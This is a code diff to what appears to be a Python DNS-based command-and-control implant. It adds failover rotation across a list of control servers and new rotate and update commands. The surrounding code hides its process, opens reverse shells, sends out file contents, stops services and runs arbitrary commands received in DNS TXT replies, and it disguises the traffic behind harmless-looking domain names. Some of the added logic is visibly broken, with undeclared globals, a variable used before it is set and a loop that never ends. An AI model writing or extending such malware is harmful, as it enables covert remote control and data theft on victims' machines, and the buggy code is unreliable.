@@ -9,8 +9,10 @@ import threading
 import base64
 from typing import Union, Sequence
 import platform
+import errno
 
 WAIT_TIME = 10
+global CURR_SERVER_INDEX
 
 def hideProccess():
     pid = os.getpid()
@@ -165,35 +167,90 @@ def spawnRevShell(host, port):
     thread = threading.Thread(target=startReverseShell, args=(host, port))
     thread.start()
 
+def phoneHome(domain, sock, recordType=None):
+    curIndex = CURR_SERVER_INDEX if IS_LIST else 0
+    if IS_LIST:
+        server = SERVER[CURR_SERVER_INDEX]
+    else:
+        server = SERVER
+    if recordType:
+        sock.sendto(makeQuery(domain, recordType), (server, 53))
+    else:
+        sock.sendto(makeQuery(domain), (server, 53))
+    try:
+        resp, _ = sock.recvfrom(512)
+        return getResponse(resp)
+    except socket.timeout:
+        if not IS_LIST:
+            return []
+        else:
+            distance = 1
+            curIndex += 1
+            while curIndex != CURR_SERVER_INDEX:
+                if curIndex >= len(SERVER):
+                    curIndex = 0
+                server = SERVER[curIndex]
+                try:
+                    if recordType:
+                        sock.sendto(makeQuery(domain, recordType), (server, 53))
+                    else:
+                        sock.sendto(makeQuery(domain), (server, 53))
+                    resp, _ = sock.recvfrom(512)
+                    rotateServer(distance)
+                    return getResponse(resp)
+                except socket.timeout:
+                    curIndex += 1
+                    distance += 1
+
+def rotateServer(distance):
+    comproised_ip = SERVER[CURR_SERVER_INDEX]
+    raw = socket.inet_aton(comproised_ip)
+    hex_ip = raw.hex()
+    CURR_SERVER_INDEX = (CURR_SERVER_INDEX + distance) % len(SERVER)
+    phoneHome(f"{distance}.{hex_ip}.supportcenter.net", sock=sock)  # Update server index on the server side
+
+global IS_LIST
+
+if isinstance(SERVER, list):
+    IS_LIST = True
+    CURR_SERVER_INDEX = 0
+else:
+    IS_LIST = False
+
 sock = formSocket()
-sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
-try:
-    resp, _ = sock.recvfrom(512)
-except socket.timeout:
-    pass
+#sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
+#try:
+#    resp, _ = sock.recvfrom(512)
+#except socket.timeout:
+#    pass
+
+phoneHome("supportcenter.net", sock=sock)
 
 time.sleep(WAIT_TIME)
 
 while True:
-    timeout = False
-    sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
-    try:
-        resp, _ = sock.recvfrom(512)
-    except socket.timeout:
-        timeout = True
-        pass
-    if not timeout:
-        ips = getResponse(resp)
+
+    ips = phoneHome("freegames.net", sock=sock)
+
+    #timeout = False
+    #sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
+    #try:
+    #    resp, _ = sock.recvfrom(512)
+    #except socket.timeout:
+    #    timeout = True
+    #    pass
+    if len(ips) > 0:
         print("Resolved IPs:", ips)
         
         if(len(ips) == 1):
             ipSplit = ips[0].split('.')
             if(ipSplit[3] == "232"): #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
                 print("Reverse Shell command recieved")
-                sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
-                resp, _ = sock.recvfrom(512)
+                ips = phoneHome("securelogin.com", sock=sock)
+                #sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
+                #resp, _ = sock.recvfrom(512)
 
-                ips = getResponse(resp)
+                #ips = getResponse(resp)
                 
                 address = ips[0]
                 portIP = ips[1]
@@ -207,20 +264,24 @@ while True:
             elif(ipSplit[3] == "85"): 
                 print("Collecting file contents")
                 
-                sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
-                resp, _ = sock.recvfrom(512)
+                #sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                #resp, _ = sock.recvfrom(512)
 
-                ips = getResponse(resp)
+                #ips = getResponse(resp)
+
+                ips = phoneHome("fileshare.org", sock=sock)
                 
                 if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                     fileName = resolveFileName(ips)
                     
                 print("Accessing file: " + fileName)
                 
-                sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
-                resp, _ = sock.recvfrom(512)
+                #sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
+                #resp, _ = sock.recvfrom(512)
                 
-                ips = getResponse(resp)
+                #ips = getResponse(resp)
+
+                ips = phoneHome("cloudlogin.com", sock=sock)
                 
                 address = ips[0]
                 portIP = ips[1]
@@ -233,23 +294,27 @@ while True:
             elif(ipSplit[3] == "150"):
                 print("Collecting service name")
                 
-                sock.sendto(makeQuery("cloudvault.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
-                resp, _ = sock.recvfrom(512)
+                #sock.sendto(makeQuery("cloudvault.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                #resp, _ = sock.recvfrom(512)
 
-                ips = getResponse(resp)
+                #ips = getResponse(resp)
+
+                ips = phoneHome("cloudvault.org", sock=sock)
                 
                 if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                     serviceName = resolveFileName(ips)
                     
                 print("Stopping service: " + serviceName)
                 os.system("systemctl stop " + serviceName)
-            elif(ipSplit[1] == "65"):
+            elif(ipSplit[3] == "65"):
                 print("Collecting command to run")
                 
-                sock.sendto(makeQuery("remotehelp.com", recordType="TXT"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
-                resp, _ = sock.recvfrom(512)
+                #sock.sendto(makeQuery("remotehelp.com", recordType="TXT"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
+                #resp, _ = sock.recvfrom(512)
 
-                data = getResponse(resp)
+                #data = getResponse(resp)
+
+                data = phoneHome("remotehelp.com", sock=sock, recordType="TXT")
                 
                 if len(data) == 1 and len(data[0].split('.')) == 4:
                     if data[0].split('.')[3] == "100":
@@ -259,5 +324,34 @@ while True:
                     
                 #print("Running command: " + command)
                 os.system(command)
+            elif(ipSplit[3] == "25"):
+                print("Rotating")
+                ips = phoneHome("sendhelp.com", sock=sock)
+                if len(data) == 1 and len(data[0].split('.')) == 4:
+                    if data[0].split('.')[3] == "100":
+                        continue #Error response, skip running command
+                else:
+                    badIP = ips[1]
+                    distance = ips[0].split('.')[3]
+                    CURR_SERVER_INDEX += distance
+                    CURR_SERVER_INDEX % SERVER
+                    x = 0
+                    while x < len(SERVER):
+                        if SERVER[x] == badIP:
+                            SERVER[x] = "XXX" + SERVER[x]
+            elif(ipSplit[3] == "55"):
+                print("Updating")
+                ips = phoneHome("findthings.org", sock=sock)
+                if len(data) == 1 and len(data[0].split('.')) == 4:
+                    if data[0].split('.')[3] == "100":
+                        continue #Error response, skip running command
+                else:
+                    old_ip = ips[0]
+                    new_ip = ips[1]
+                    x = 0
+                    while x < len(SERVER):
+                        if old_ip in SERVER[x]:
+                            SERVER[x] = new_ip
                 
     time.sleep(WAIT_TIME)
+
